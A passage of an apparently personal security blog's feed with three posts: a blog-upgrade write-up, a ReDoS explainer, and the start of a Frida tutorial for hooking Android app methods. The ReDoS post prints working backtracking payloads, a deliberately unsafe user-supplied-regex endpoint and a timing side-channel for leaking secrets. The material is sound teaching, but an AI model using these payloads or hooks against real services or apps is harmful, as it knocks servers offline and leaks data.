punctuation">;</span>  <span class="token property">--nav-link-text-color</span><span class="token punctuation">:</span> #b4b5b4<span class="token punctuation">;</span>  <span class="token property">--notice-bg-color</span><span class="token punctuation">:</span> #257800<span class="token punctuation">;</span>  <span class="token property">--archive-time-color</span><span class="token punctuation">:</span> #ddd<span class="token punctuation">;</span>  <span class="token property">--archive-hover-border-color</span><span class="token punctuation">:</span> #51ce97<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>And the JavaScript looks like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'true'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>matchMedia <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span><span class="token function">matchMedia</span><span class="token punctuation">(</span><span class="token string">'(prefers-color-scheme: dark)'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'dark-mode'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It took me about half a day to modify and test it, and then it was done.</p><p>I also solved the problem of CSS size and used this service to remove unused CSS: <a href="https://purifycss.online/">https://purifycss.online/</a></p><p>Although there may still be some residual or mistakenly deleted CSS, remember to check it again after using it.</p><h2><span id="automatic-translation">Automatic translation</span></h2><p>The highlight of this update is the automatic translation feature, which relies heavily on chatGPT.</p><p><img src="/img/update-blog-with-chatgpt/p3.png" alt="translation"></p><p>The most important part of the translation is done by <a href="https://github.com/smikitky/markdown-gpt-translator">markdown-gpt-translator</a>, which automatically divides the text into paragraphs and calls the API, and then assembles the results.</p><p>Another great thing is that code blocks are not uploaded, so it saves a lot of tokens, but be aware that comments in code blocks need to be translated manually.</p><p>After verifying that this translation library can be used, I started to modify it and integrate it with the automatic translation feature I wanted.</p><p>And because the TypeScript environment setup is a bit tricky, I used this tool to convert it directly to JavaScript: <a href="https://transform.tools/typescript-to-javascript">https://transform.tools/typescript-to-javascript</a></p><p>To automatically translate all the old articles, I followed these steps:</p><ol><li>List all the files of the articles</li><li>Check if the translated version exists</li><li>If it doesn’t exist, call the translation API and write it to the file</li></ol><p>I tell chatGPT to help me write some utility functions, and I adjusted and supplemented the details and the structure.</p><p><img src="/img/update-blog-with-chatgpt/p2.png" alt="chatgpt"></p><p>For my own articles, it takes about a minute to translate one, and the price is about 0.02 to 0.04 dollars. After translating more than 100 articles, it cost me less than 3 dollars, which I think is quite cheap.</p><p>However, there are still many places that need to be manually adjusted. I put the code and things to note here: <a href="https://github.com/aszx87410/huli-blog/tree/master/apps/translator">https://github.com/aszx87410/huli-blog/tree/master/apps/translator</a></p><p>Actually, after the translation was completed, I wanted to review them one by one, but I found it too time-consuming, so I left it for later.</p><h2><span id="updating-open-graph-image">Updating Open Graph Image</span></h2><p>I previously wrote a small function to generate a preview image, but many articles didn’t use this function before. This time, I used chatGPT to help me write a small program that can quickly convert them.</p><p>I slightly modified the previous code, scanned all the old articles, automatically generated the missing ones, and added the correct path.</p><h2><span id="unfinished-features">Unfinished features</span></h2><p>Finally, a note on the unfinished features that will be more convenient to work on in the future:</p><ol><li>Update sitemap</li><li>Check English article links</li><li>Check English article content</li><li>Modify comment system</li><li>Modify multilingual RSS</li><li>Automatically compress images.</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;It’s been a long time since I made any major changes to my blog structure. Hexo has already released v6, and v7 is currently in beta, but my blog is still on hexo3.&lt;/p&gt;
&lt;p&gt;Recently, I had some free time and decided to update my blog, and also use chatGPT as a helper.&lt;/p&gt;
&lt;p&gt;The changes I made this time are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Upgraded Hexo version&lt;/li&gt;
&lt;li&gt;Modified syntax highlight&lt;/li&gt;
&lt;li&gt;Dark mode&lt;/li&gt;
&lt;li&gt;Automatic translation (highlight)&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Others" scheme="https://blog.huli.tw/categories/Others/"/>
    
    
    <category term="Others" scheme="https://blog.huli.tw/tags/Others/"/>
    
  </entry>
  
  
  
  <entry>
    <title>ReDoS: Attacks using regexp</title>
    <link href="https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/"/>
    <id>https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/</id>
    <published>2023-06-12T06:10:44.000Z</published>
    <updated>2023-06-20T05:10:49.074Z</updated>
    
    <content type="html"><![CDATA[<p>Regular expressions (hereinafter referred to as regexp), are mainly used for string matching. After writing a pattern, it can be used to match text that meets the rules.</p><p>Whether it’s a phone number, email, or ID number, regexp can be used to perform basic format validation to ensure that the string format matches specific rules.</p><p>Although regexp is convenient, if it is not written properly, it may cause some input validations to be bypassed and evolve into a security issue. In addition to this, there is another type of problem that will cause issues, which is ReDoS, the full name is: Regular expression Denial-of-Service, due to the denial of service attack caused by regular expressions.</p><span id="more"></span><p>Before talking about ReDoS, let’s first mention what is DoS.</p><p>For example, suppose a website framework does not parse HTTP requests well and crashes when encountering special characters, causing the server to restart. At this time, attackers can continuously send such requests that will cause the website to crash, causing the server to keep restarting, which is a DoS attack.</p><p>If you want to divide it further, you can also divide it into which layer is being attacked, such as the network layer or the application layer, etc. This article is about attacks on the application layer.</p><p>Most of the attacks you see in network news are DDoS, with an additional D in front, meaning distributed, and most of them are attacks on the network layer. As can be seen from the DoS example we mentioned earlier, basically, it is because the website itself has problems, such as not considering special situations, etc., that attackers can use it, and DDoS is more like: “I will find a bunch of people to overload you regardless of whether you have problems or not.”</p><p>To give a real-life example, suppose you run a snack shop that sells common items like dry noodles and boiled greens. Because it takes a lot of time to look at the customer’s menu and what they ordered, and it feels impersonal to order with a mobile phone, you ordered a “menu reading robot” to help you look at the customer’s order.</p><p>At this time, I deliberately drew symbols on the menu, but some places looked normal, making it difficult to read the menu, and the robot’s recognition function was not done well and could not be interpreted, so it stopped. This is called DoS, exhausting resources with one’s own strength.</p><p>I will find a hundred people to go to your place, and each person will draw a lot of blank menus and throw them to the robot, making the robot overwhelmed and unable to handle other customers’ menus. This is called DDoS.</p><p>In short, DoS is usually “able to cause service interruption with a small amount of resources”, while DDoS is “using a lot more resources to directly knock out your service.”</p><p>Okay, let’s talk about DoS. As can be seen from the example above, when your program itself has some problems, it is the easiest to have problems. If this premise is met, it is easy to use a simple method to knock out your service.</p><p>ReDoS relies on poorly written regular expressions to achieve this.</p><h2><span id="without-further-ado-lets-take-an-example">Without further ado, let’s take an example</span></h2><p>The fastest way is to look at the example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(a|a?)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// test: 2128.498046875 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>A 26-character string takes 2 seconds to match. By the way, the time required for this regexp is calculated in multiples, and one more character requires 4 seconds, then 8 seconds, 16 seconds, and so on.</p><p>So why does this regexp take so long?</p><p>This is related to the implementation and principle of the regexp engine. I haven’t studied the details yet, so I won’t mislead the public. But simply put, the regexp engine must traverse all possibilities before it can find that the string does not match, so it takes so long.</p><p>In summary, if the regexp is not written well, it will consume a lot of time when used.</p><h2><span id="actual-case">Actual case</span></h2><p>You may think, is it so easy to write regexp wrong?</p><p>Yes, a lot of libraries have had ReDoS vulnerabilities, and someone has compiled a detailed list: <a href="https://github.com/engn33r/awesome-redos-security">Awesome ReDoS Security</a></p><p>For example, CKEditor used to have a regexp that detects whether it is a picture URL. After passing in a carefully constructed string, it takes 6 seconds to execute:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0</span><span class="token keyword">const</span> <span class="token constant">IMAGE_URL_REGEXP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span> <span class="token function">String</span><span class="token punctuation">(</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(http(s)?:\/\/)?[\w-]+(\.[\w-]+)+[\w._~:/?#[\]@!$&amp;'()*+,;=%-]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token operator">+</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)\??[\w._~:/#[\]@!$&amp;'()*+,;=%-]*$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">IMAGE_URL_REGEXP</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a.'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeLog</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">// test: 6231.137939453125 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Although the length of the string is 100,000, if it is changed to a version without problems, the result can be obtained in less than 1 millisecond:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0</span><span class="token keyword">const</span> <span class="token constant">IMAGE_URL_REGEXP</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span> <span class="token function">String</span><span class="token punctuation">(</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^(http(s)?:\/\/)?[\w-]+\.[\w._~:/?#[\]@!$&amp;'()*+,;=%-]+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token operator">+</span>    <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)(\?[\w._~:/#[\]@!$&amp;'()*+,;=%-]*)?$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">IMAGE_URL_REGEXP</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'a.'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeLog</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment">// test: 0.570068359375 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In JavaScript, these matching codes are all run on the main thread. If it is a webpage, the screen will freeze directly, and if it is executed with Node.js, the server will also be stuck and unable to handle other requests.</p><h2><span id="how-to-know-if-there-is-a-risk-of-redos">How to know if there is a risk of ReDoS?</span></h2><p>There are some ready-made tools that can help, and the one I use most often is this: <a href="https://devina.io/redos-checker">https://devina.io/redos-checker</a></p><p>Just throw the regexp in, and it will tell you if there are any problems. If there are, it will even provide a test string for you to test again.</p><p><img src="/img/redos-regular-expression-denial-of-service/p1.png" alt="devina redos checker"></p><p>However, sometimes there may be false positives, where it thinks there is a problem but there isn’t, or there may actually be a problem, but the attack string it provides doesn’t work. Therefore, it is still recommended to test the payload it provides again after testing to confirm.</p><h2><span id="application-of-redos-in-attacks">Application of ReDoS in attacks</span></h2><p>The previous discussion was all about “the regexp is already written, and the user can control the input”. In this case, all you have to do is find the problematic regexp and generate an attack string.</p><p>There is another situation where “the user can control the regexp”. For example, suppose there is a website that provides a search function for users, and you can pass in a regexp, and the server will return whether there is a username that matches this regexp.</p><p>The server’s implementation is roughly as follows (written arbitrarily, just to convey the idea):</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q    <span class="token keyword">return</span> users        <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">user</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This dangerous function not only allows attackers to get all the usernames, but also has the risk of ReDoS.</p><p>For example, when <code>/((([^m]|[^m]?)+)+)+$/</code> encounters <code>&quot;username&quot;</code>, it takes nearly 4 seconds to complete:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">((([^m]|[^m]?)+)+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// test: 3728.89990234375 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>As long as you continue to extend the regexp in the same pattern, you can make this entire block of code run for more than 30 seconds or longer, paralyzing the entire server.</p><p>Another common situation when playing CTF is that you can also pass in a regexp, but the server won’t tell you if it was successful. You can only judge based on the time difference, and ReDoS is very useful in this case:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">CTF&#123;[a](((((.*)*)*)*)*)!</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;this_is_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// CTF&#123;a: 0.071ms</span>console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">CTF&#123;[t](((((.*)*)*)*)*)!</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;this_is_flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'CTF&#123;t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// CTF&#123;t: 24.577s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By passing in a carefully constructed regexp, you can use the time difference to know what the first character is.</p><p>Finally, a simple defense method is mentioned. The most fundamental solution is not to write flawed regexps. First, learn which patterns should be used as little as possible, and you can grasp the general direction. In addition, it seems that some people have done some automated tools to help scan the regexps that appear in the code, which is also a way to prevent problems before they occur.</p><h2><span id="summary">Summary</span></h2><p>I personally think that ReDoS is a pretty interesting attack method. I never thought that such an effect could be achieved by relying on regexps.</p><p>The first time I learned about this attack, I seemed to be still a developer. I occasionally saw libraries with this vulnerability being used, but I didn’t care much about it at the time. Later, I encountered this thing again in information security, and I felt that it was quite interesting.</p><p>This article is more like my personal notes, just wanting to record some payloads while the memory is still fresh, so it’s easier to find them later.</p><p>Finally, here are some reference materials and further reading. Interested readers can take a look:</p><ol><li><a href="https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos">HackTricks - Regular expression Denial of Service - ReDoS</a></li><li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP: Regular expression Denial of Service - ReDoS</a></li><li><a href="https://learn.snyk.io/lessons/redos/javascript/">snyk: ReDoS</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Regular expressions (hereinafter referred to as regexp), are mainly used for string matching. After writing a pattern, it can be used to match text that meets the rules.&lt;/p&gt;
&lt;p&gt;Whether it’s a phone number, email, or ID number, regexp can be used to perform basic format validation to ensure that the string format matches specific rules.&lt;/p&gt;
&lt;p&gt;Although regexp is convenient, if it is not written properly, it may cause some input validations to be bypassed and evolve into a security issue. In addition to this, there is another type of problem that will cause issues, which is ReDoS, the full name is: Regular expression Denial-of-Service, due to the denial of service attack caused by regular expressions.&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Android App Reverse Engineering Part 4: Dynamic Analysis with Frida</title>
    <link href="https://blog.huli.tw/2023/04/27/en/android-apk-decompile-intro-4/"/>
    <id>https://blog.huli.tw/2023/04/27/en/android-apk-decompile-intro-4/</id>
    <published>2023-04-27T07:10:44.000Z</published>
    <updated>2023-06-20T05:10:49.041Z</updated>
    
    <content type="html"><![CDATA[<p>In the previous articles, we talked about static analysis, which means we didn’t actually run the app. Instead, we studied the logic of the app’s operation through decompiled code and modified the code before repackaging and executing it.</p><p>Dynamic analysis, on the other hand, means that we will run the app and use various methods to hook various methods to monitor the input and output of certain methods, and even tamper with them.</p><p>In this article, let’s learn how to use Frida for dynamic analysis.</p><span id="more"></span><p>Series links:</p><ol><li><a href="/2023/04/27/en/android-apk-decompile-intro-1/">Android App Reverse Engineering Part 1: Decompiling and Rebuilding APKs</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-2/">Android App Reverse Engineering Part 2: Modifying Smali Code</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-3/">Android App Reverse Engineering Part 3: Monitoring App Packets</a></li><li><a href="/2023/04/27/en/android-apk-decompile-intro-4/">Android App Reverse Engineering Part 4: Dynamic Analysis with Frida</a></li></ol><h2><span id="tool-introduction-frida">Tool Introduction: Frida</span></h2><p>The dynamic analysis tool we will be using this time is <a href="https://frida.re/">Frida</a>. The official website describes it as a “Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.” It can be used for dynamic analysis on not only Android but also other platforms.</p><p>There is a tool called Objection that is based on Frida, and it is recommended to install it directly because it will also install Frida. Installation instructions can be found here: <a href="https://github.com/sensepost/objection/wiki/Installation">https://github.com/sensepost/objection/wiki/Installation</a></p><p>To use Frida, it must be installed on both the phone and the computer. Installation instructions can be found on the official website: <a href="https://frida.re/docs/installation/">https://frida.re/docs/installation/</a></p><p>Also, if you have Frida installed on your phone but are switching to a different computer, make sure to install the same version. The steps are:</p><ol><li>Check the version of Frida on your phone: <code>frida-server --version</code>, assuming it is 15.1.14.</li><li>Find the version number of frida-tools here: <a href="https://github.com/frida/frida/releases/tag/15.1.14">https://github.com/frida/frida/releases/tag/15.1.14</a></li><li>Install these two on your computer:</li></ol><pre class="line-numbers language-none"><code class="language-none">pip install frida&#x3D;&#x3D;15.1.14pip install frida-tools&#x3D;&#x3D;10.4.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Make sure the version numbers match, or you will encounter errors.</p><p>Although Frida may seem like it requires root access, there are actually two ways to run it: one that requires root access and one that does not.</p><p>To use the version that requires root access, install frida-server on your phone. Details can be found on the official website: <a href="https://frida.re/docs/android/">https://frida.re/docs/android/</a></p><p>Basically, you just need to run an executable on your phone with root privileges. If it is not the default root when you run the file, you can use <code>adb shell</code> to change it:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell<span class="token comment"># kill old process</span><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> frida-server<span class="token function">kill</span> <span class="token parameter variable">-9</span> <span class="token punctuation">&#123;</span>your_process_id<span class="token punctuation">&#125;</span><span class="token comment"># run as root</span><span class="token function">su</span>/data/local/tmp/frida-server <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After running it, you can use <code>frida-ps -U</code> to confirm that it is running.</p><p>The second method, which does not require root access, involves modifying the APK. You add a Frida so file to the APK and add a line of <code>System.loadLibrary()</code> at the entry point to use Frida. Details can be found in the wiki: <a href="https://github.com/sensepost/objection/wiki/Patching-Android-Applications">https://github.com/sensepost/objection/wiki/Patching-Android-Applications</a></p><p>You don’t need to execute the above process yourself; there are ready-made commands to help you. If you can’t package it, you can use this command:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objection patchapk <span class="token parameter variable">--source</span> test.apk --skip-resources --ignore-nativelibs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>If it still doesn’t work, you can use the knowledge we learned earlier to modify it yourself. First, use <code>apktool d</code> to unpack the packaged APK, then modify the contents yourself. For example, sometimes there may be an alignment issue with the so file, so you can change <code>android:extractNativeLibs</code> in <code>AndroidManifest.xml</code> to true and then repack it.</p><h2><span id="basic-usage-of-frida">Basic Usage of Frida</span></h2><p>First, let’s talk about what Frida does. The most common use case is to write some code to hook functions. Hooking means that you can override the implementation of any function, observe input and output, and change the return value of the function.</p><p>These codes are written in JavaScript and injected into the app when it is launched. In my experience, after seeing more examples, it is quite easy to get started.</p><p>Instead of talking so much, let’s try it out. The sample app used this time is the same as the first article, which is an app that checks whether the device is rooted after pressing a button: <a href="https://github.com/aszx87410/demo/raw/master/android/demoapp.apk">https://github.com/aszx87410/demo/raw/master/android/demoapp.apk</a></p><p>After opening this app, the default activity will be <code>com.cymetrics.demo/MainActivity</code>. Let’s hook the onCreate method of this class.</p><p>First, create a file named <code>script.js</code> with the following content:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then run the command:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frida <span class="token parameter variable">-U</span> --no-pause <span class="token parameter variable">-l</span> script.js <span class="token parameter variable">-f</span> <span class="token string">"com.cymetrics.demo"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>If you don’t have root, the startup method will be different. First, patch the app as mentioned above, then install it on your phone, and then enter the following command in the terminal:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">frida <span class="token parameter variable">-U</span> Gadget <span class="token parameter variable">-l</span> script.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Then you should see a new log line on your terminal, which is <code>MainActivity onCreate</code>, and the app on your phone crashes. This is normal.</p><p>Let’s briefly talk about the basic structure of Frida scripts. The starting point is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// code</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then it depends on what method you want to hook. In our previous code, we first use <code>Java.use</code> to get the class we want to hook, and then use <code>MainActivity.onCreate.implementation</code> to replace the original implementation with our own function.</p><p>Why did the app crash after hooking? Because the function we implemented ourselves did nothing except log, which means that everything the original onCreate should have done was removed, so the crash is reasonable. To find out the root cause of the crash, you can use <code>adb logcat | grep AndroidRuntime</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">android.util.SuperNotCalledException: Activity <span class="token punctuation">&#123;</span>com.cymetrics.demo/com.cymetrics.demo.MainActivity<span class="token punctuation">&#125;</span> did not call through to super.onCreate<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>So what should we do? Just remember to call the original implementation at the end, like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token 